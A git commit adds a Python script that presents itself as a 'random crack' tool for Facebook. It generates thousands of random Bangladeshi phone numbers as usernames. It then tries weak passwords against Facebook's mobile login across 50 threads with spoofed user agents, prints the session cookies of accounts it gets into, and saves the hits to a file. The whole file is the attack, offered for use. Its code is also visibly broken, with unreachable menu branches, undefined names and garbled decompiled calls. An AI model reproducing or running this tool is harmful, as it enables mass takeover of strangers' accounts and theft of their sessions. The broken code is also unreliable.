80fa244c9a0ede3e14be2ed383004cc7b9ca1923
ITZ-JISAN <127544614+X1X4D-2-0@users.noreply.github.com>
2023-07-10 13:04:25 +0600

    Add files via upload

---
+++ ok.py
@@ -0,0 +1,270 @@
+#####################
+#___MAKE BY ITZ JISAN
+#####################
+import os
+import sys
+import time
+import requests
+import uuid
+
+
+def o():
+    _JISAN_('clear')
+    logo()
+    print('\033[1;32m─────────────────────────────────────────────────────────')
+    JISAN('\033[1;95m[\033[1;93m1\033[1;95m]\033[1;96m RANDOM CRACK ')
+    JISAN('\033[1;95m[\033[1;93m2\033[1;95m]\033[1;96m CONTACT ME FACEBOOK')
+    JISAN('\033[1;95m[\033[1;93m3\033[1;95m]\033[1;96m FOLLOW MY FACEBOOK PAGE ')
+    JISAN('\033[1;95m[\033[1;93m4\033[1;95m]\033[1;96m FOLLOW NY GROUP')
+    JISAN('\033[1;95m[\033[1;93m0\033[1;95m]\033[1;91m EXIT')
+    opt = input('\n\x1b[1;32mCHOOSE : ')
+    if opt == '1':
+        i()
+    if None == '2':
+        _JISAN_('xdg-open https://www.facebook.com/TurRealabbu1')
+        return None
+    if None == '3':
+        _JISAN_('xdg-open https://www.facebook.com/Atticking420/')
+        return None
+    if None == '4':
+        _JISAN_('xdg-open https://www.facebook.com/groups/636153321502454')
+        return None
+    if None == '0':
+        _JISAN_('exit')
+        return None
+
+
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from os import system as _JISAN_
+from time import sleep
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    _JISAN_('pip install mechanize requests futures bs4==2 > /dev/null')
+    _JISAN_('pip install bs4')    
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://free.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
+            
+            
+ 
+class JISAN:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' #
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+A = '\x1b[1;90m' # WARNA ABU ABU
+BN = '\x1b[1;107m' # BELAKANG PUTIH
+BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b[1;105m' # BELAKANG PINK
+BB = '\x1b[1;104m' # BELAKANG BIRU
+BK = '\x1b[1;103m' # BELAKANG KUNING
+BH = '\x1b[1;102m' # BELAKANG HIJAU
+BM = '\x1b[1;101m' # BELAJANG MERAH
+BA = '\x1b[1;100m' # BELAKANG ABU ABU
+def hahaha():
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+def logo():
+    hahaha()
+    color_logo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\x1b[38;5;208m'])
+    JISAN("""
+\033[33;1m ╦ ╦\033[31;1m╔═╗\033[34;1m╔╦╗\033[35;1m╦\033[32;1m╔╦╗ \x1b[1;96m╦ ╦\x1b[38;5;208m╔╦╗\033[31;1m╔╦╗\033[1;97m╦\033[1;30m╔╗╔\33[33;1m  ╦\33[35;1m╦\33[32;1m╔═╗\33[31;1m╔═╗\33[34;1m╔╗╔
+\033[33;1m ╠═╣\033[31;1m╠═╣\033[34;1m║║║\033[35;1m║\033[32;1m║║║ \x1b[1;96m║ ║ \x1b[38;5;208m║║ \033[31;1m║║\033[1;97m║\033[1;30m║║║ \33[33;1m ║\33[35;1m║\33[32;1m╚═╗\33[31;1m╠═╣\33[34;1m║║║
+\033[33;1m ╩ ╩\033[31;1m╩ ╩\033[34;1m╩ ╩\033[35;1m╩\033[32;1m╩ ╩ \x1b[1;96m╚═╝\x1b[38;5;208m═╩╝\033[31;1m═╩╝\033[1;97m╩\033[1;30m╝╚╝ \33[33;1m╚╝\33[35;1m╩\33[32;1m╚═╝\33[31;1m╩ ╩\33[34;1m╝╚╝
+\033[38;5;46m┌━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┐\033[33;1m \033[38;5;46m
+\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1mITZ JISAN XHOWDHURY    \033[38;5;46 
+\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1mX1X4D-2-0        \033[38;5;46m │  \033[33;1
+\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗   \033[1;97m   :  \033[34;1m01814649133       \033[38;5;46m│
+\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘗𝘖𝘞𝘌𝘙       \033[1;97m  :  \033[34;1mITZ JISAN         \033[38;5;46m│
+\033[38;5;46m└━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┘""")
+loop = 0
+oks = []
+cps = []
+ 
+def clear():
+    _JISAN_('clear')
+    logo()
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+    
+    
+try:
+    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
+    v = 5.2
+    hahaha()
+    update = ('5.2')
+    update = ('5.2')
+    if str(v) in update:
+        _JISAN_('clear')
+    else:pass
+except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
+#global functions
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
+
+#User agents
+ugen2=[]
+ugen=[]
+ 
+ugen=[ ]
+for ua in range(5000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['5.0.2','6.0.1','5.1.1','5.0','5.0.1','7.0','10','11','12','13','14','15','16','17','18','19','20'])
+    c='SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=random.randrange(40,115)
+    e='0'
+    f=random.randrange(3000,6000)
+    g=random.randrange(20,100)
+    h='Mobile Safari/537.36'
+    ug=(f"{a}  {b} ;  {c} {d}.{f}.{g} {h}")
+    ugen.append(ug) 
+
+# APK CHECK
+def i():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    _JISAN_("clear")
+    hahaha()
+    logo()
+    JISAN('\033[1;92m─────────────────────────────────────────────────────')
+    JISAN('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;32mBD CODE    - \033[1;32m016 \033[1;32m017 \033[1;32m018 \033[1;32m019')
+    JISAN('\033[1;92m─────────────────────────────────────────────────────\n')
+    code = input('\033[1;35m\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;32mCHOOSE YOUR COUNTRY CODE : ')
+    print("")
+    _JISAN_('clear')
+    bal = input("ENTER YOUR NAME : ")
+    _JISAN_('clear')
+    logo()
+    limit = int(input('EXAMPLE: 3000, 5000, 15000, 20000\n\n\033[1;91m\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;32mCHOOSE CRACKING LIMIT : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=50) as manshera:
+        clear()
+        tl = str(len(user))
+        IP = requests.get('https://api.ipify.org').text
+        print(f"\033[1;91m[\033[1;92m✔︎\033[1;32m]{GREEN} TODAY DATE & TIME :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
+        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m USER\'S NAME : \033[1;92m'+bal)
+        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;32m'+code)
+        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m TOTAL IDS : \033[1;92m'+tl)
+        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m YOUR IP ADDRESS : \033[1;32m'+IP)
+        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m CRACKING HAS STARTED')
+        print('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m WORKS ON DATA AND WIFI')
+        print('\033[1;93m─────────────────────────────────────────────────────')
+        for love in user:
+            pwx = [love, 'JISAN123','JISAN1234']
+            uid = code+love
+            manshera.submit(rcrack,uid,pwx,tl)
+    print(' CRACK PROCESS HAS BEEN COMPLETED ')
+    print('IDS SAVED IN XD-505-OK.txt, XD-505-CP.txt')
+ 
+def rcrack(uid,pwx,tl):
+    hahaha()
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "next":"https://web.facebook.com/login/device-based/regular/login/?refsrc",
+            "flow":"login_no_pain",
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method': 'GET',
+            'scheme': 'https',
+            'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                uid = coki[7:22]
+                print('\x1b[1;96mJISAN-XD-OK ]' +cid+ ' | ' +ps+'\x1b[1;96m')
+                print(f"{H}\033[0;35m[🍪]COOKIE :\033[1;32m{coki}")
+                cek_apk(session,coki)
+                uid('/sdcard/JISAN-XD-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        hahaha()
+        sys.stdout.write('\r%s[JISAN-XD] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+
+o()
